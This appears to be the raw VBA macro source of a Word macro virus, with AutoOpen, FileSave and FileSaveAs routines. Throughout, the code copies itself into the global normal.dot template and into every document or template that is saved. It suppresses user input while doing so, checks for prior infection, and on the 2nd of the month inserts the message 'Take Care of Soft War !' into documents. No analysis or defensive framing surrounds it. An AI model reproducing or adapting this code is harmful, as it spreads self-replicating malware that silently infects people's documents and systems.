   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "FileSaveAs"

   Public Sub MAIN()
   Dim TFLAG
   Dim SourceTemp$
   Dim DestTemp$
   Dim count_
   Dim name_$
   On Error GoTo -1: On Error GoTo Quit

   WordBasic.DisableInput

   TFLAG = 0

   SourceTemp$ = WordBasic.[DefaultDir$](2) + "\" + "normal.dot"

   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
   WordBasic.Dialog.FileSaveAs dlg

   WordBasic.FileSaveAs Name:=dlg.Name, Format:=dlg.Format, _
    LockAnnot:=dlg.LockAnnot, AddToMru:=dlg.AddToMru, _
    EmbedFonts:=dlg.EmbedFonts, _
    NativePictureFormat:=dlg.NativePictureFormat, _
    FormsData:=dlg.FormsData

   DestTemp$ = dlg.Name


   Set dlg = WordBasic.CurValues.FileTemplates

   If dlg.Template <> "Normal" And dlg.Template <> "" Then
     If InStr(dlg.Template, "normal.dot") = 0 Then
       If InStr(dlg.Template, ".") > 1 Then
           DestTemp$ = dlg.Template
           TFLAG = 1
       End If
     End If
   End If


   '

   For count_ = 1 To WordBasic.CountMacros(1)
           name_$ = WordBasic.[MacroName$](count_, 1)
               If name_$ = "AutoOpen" Then
                   GoTo Quit
               End If
               If name_$ = "FileSaveAs" Then
                   GoTo Quit
               End If
               If name_$ = "FileSave" Then
                   GoTo Quit
               End If
   Next count_

   '

   WordBasic.Organizer Copy:=1, Source:=SourceTemp$, _
           Destination:=DestTemp$, _
           Name:="AutoOpen", Tab:=3

   WordBasic.Organizer Copy:=1, Source:=SourceTemp$, _
           Destination:=DestTemp$, _
           Name:="FileSaveAs", Tab:=3

   WordBasic.Organizer Copy:=1, Source:=SourceTemp$, _
           Destination:=DestTemp$, _
           Name:="FileSave", Tab:=3

   If TFLAG = 0 Then
       WordBasic.FileSaveAs Name:=DestTemp$, Format:=1
   Else
       WordBasic.FileSaveAll 1
   End If

   Quit:

   WordBasic.DisableInput 0

   End Sub


   Attribute VB_Name = "FileSave"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Ñîõðàíåíèå àêòèâíîãî äîêóìåíòà èëè øàáëîíà"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSave.MAIN"
   Dim SourceTemp$
   Dim TFLAG
   Dim DestTemp$
   Dim count_
   Dim name_$
   Dim i
   Dim j
   On Error GoTo -1: On Error GoTo Quit

   WordBasic.DisableInput

   SourceTemp$ = WordBasic.[DefaultDir$](2) + "\" + "normal.dot"

       TFLAG = 0

       Dim dlg As Object: Set dlg = WordBasic.DialogRecord.DocumentStatistics(False)
           WordBasic.CurValues.DocumentStatistics dlg

       If dlg.Directory <> "" Then
         DestTemp$ = dlg.Directory + "\" + dlg.FileName + ".doc"
       Else
         DestTemp$ = WordBasic.[DefaultDir$](14) + "\" + dlg.FileName + ".doc"
       End If


       Set dlg = WordBasic.CurValues.FileTemplates

   If dlg.Template <> "Normal" And dlg.Template <> "" Then
        If InStr(dlg.Template, "normal.dot") = 0 Then
           TFLAG = 1
           DestTemp$ = dlg.Template
        End If
   End If

   '

   For count_ = 1 To WordBasic.CountMacros(1)
           name_$ = WordBasic.[MacroName$](count_, 1)
               If name_$ = "AutoOpen" Then
                   WordBasic.FileSave
                   GoTo Quit
               End If
               If name_$ = "FileSaveAs" Then
                   WordBasic.FileSave
                   GoTo Quit
               End If
               If name_$ = "FileSave" Then
                   WordBasic.FileSave
                   GoTo Quit
               End If
   Next count_

   '

   WordBasic.Organizer Copy:=1, Source:=SourceTemp$, _
           Destination:=DestTemp$, _
           Name:="AutoOpen", Tab:=3

   WordBasic.Organizer Copy:=1, Source:=SourceTemp$, _
           Destination:=DestTemp$, _
           Name:="FileSaveAs", Tab:=3

   WordBasic.Organizer Copy:=1, Source:=SourceTemp$, _
           Destination:=DestTemp$, _
           Name:="FileSave", Tab:=3


   If TFLAG = 0 Then
       WordBasic.FileSaveAs Name:=DestTemp$, Format:=1
   Else
       WordBasic.FileSaveAll 1
   End If

   Quit:

   WordBasic.DisableInput 0

   If WordBasic.Day(WordBasic.Now()) = 2 Then
       If WordBasic.Second(WordBasic.Now()) < 10 Then

           WordBasic.EndOfDocument
           For i = 1 To 4
           WordBasic.InsertPara
           WordBasic.InsertPara
                   For j = 1 To i
                       WordBasic.Insert Chr(9)
                   Next j
           WordBasic.FontSize 24
           WordBasic.Bold
           WordBasic.Italic
           WordBasic.Insert "Take Care of Soft War !"
           Next
           WordBasic.StartOfDocument

       End If
   End If


   End Sub


   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim Templ$
   Dim SourceTemp$
   Dim DestTemp$
   On Error GoTo -1: On Error GoTo Quit

   WordBasic.DisableInput

   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileTemplates(False)
   WordBasic.CurValues.FileTemplates dlg
   Templ$ = dlg.Template

   If Templ$ = "" Then

           Set dlg = WordBasic.CurValues.DocumentStatistics
       SourceTemp$ = dlg.Directory + "\" + dlg.FileName + ".doc"
   Else
       SourceTemp$ = Templ$
   End If

   WordBasic.AddAddIn SourceTemp$, 1

   DestTemp$ = WordBasic.[DefaultDir$](2) + "\" + "normal.dot"

   WordBasic.Organizer Copy:=1, Source:=SourceTemp$, _
           Destination:=DestTemp$, _
           Name:="AutoOpen", Tab:=3

   WordBasic.Organizer Copy:=1, Source:=SourceTemp$, _
           Destination:=DestTemp$, _
           Name:="FileSaveAs", Tab:=3

   WordBasic.Organizer Copy:=1, Source:=SourceTemp$, _
           Destination:=DestTemp$, _
           Name:="FileSave", Tab:=3


   Quit:

   WordBasic.DisableInput 0

   WordBasic.DisableAutoMacros

   End Sub
